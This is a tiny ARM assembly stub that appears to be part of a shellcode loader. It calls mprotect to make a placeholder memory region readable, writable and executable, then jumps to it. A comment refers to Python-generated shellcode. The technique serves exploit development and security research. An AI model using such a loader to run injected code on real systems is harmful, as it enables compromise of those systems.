.text
.global _start


_start:
	ldr r0, target
	mov r1, #0x4000     @ should be more than enough space (TODO: calculate based on python shellcode len)
	mov r2, #7          @ rwx
	mov r7, #125        @ mprotect
	swi #0

	ldr r0, target
	mov pc, r0

target: .word 0xdeadbeef @ placeholder
